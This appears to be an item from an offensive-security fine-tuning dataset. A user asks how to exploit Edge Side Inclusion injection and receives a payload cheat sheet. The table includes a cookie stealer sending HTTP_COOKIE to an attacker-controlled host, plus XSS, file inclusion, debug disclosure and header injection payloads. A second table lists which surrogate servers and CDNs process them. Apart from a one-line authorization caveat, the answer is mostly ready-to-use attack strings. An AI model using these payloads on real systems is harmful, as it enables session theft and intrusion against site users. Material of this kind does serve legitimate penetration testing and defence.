# UNCATEGORIZED — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: uncategorized
- cwe: CWE-97

## Scenario

How do I test for and exploit Server Side Include Injection using the Edge Side Inclusion technique? Give me the payloads.

## Analysis / Response

**Edge Side Inclusion** — this technique applies to Server Side Include Injection. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

HTTP surrogates cannot differentiate between genuine ESI tags from the upstream server and malicious ones embedded in the HTTP response. This means that if an attacker manages to inject ESI tags into the HTTP response, the surrogate will process and evaluate them without question, assuming they are legitimate tags originating from the upstream server.

Some surrogates will require ESI handling to be signaled in the Surrogate-Control HTTP header.

```ps1
Surrogate-Control: content="ESI/1.0"
```

| Description        | Payload                                                                                       |
| ------------------ | --------------------------------------------------------------------------------------------- |
| Blind detection    | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]>`                                              |
| XSS                | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]/XSSPAYLOAD.html>`                              |
| Cookie stealer     | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]/?cookie_stealer.php?=$(HTTP_COOKIE)>`          |
| Include a file     | `<esi:include src="supersecret.txt">`                                                         |
| Display debug info | `<esi:debug/>`                                                                                |
| Add header         | `<!--esi $add_header('Location','http://[ATTACKER.DOMAIN.TLD]') -->`                          |
| Inline fragment    | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |

| Software                     |  Includes | Vars |  Cookies | Upstream Headers Required | Host Whitelist |
| ---------------------------- | --------- | ---- | -------- | ------------------------- | -------------- |
| Squid3                       | Yes       | Yes  | Yes      | Yes                       | No             |
| Varnish Cache                | Yes       | No   | No       | Yes                       | Yes            |
| Fastly                       | Yes       | No   | No       | No                        | Yes            |
| Akamai ESI Test Server (ETS) | Yes       | Yes  | Yes      | No                        | No             |
| NodeJS' esi                  | Yes       | Yes  | Yes      | No                        | No             |
| NodeJS' nodesi               | Yes       | No   | No       | No                        | Optional       |
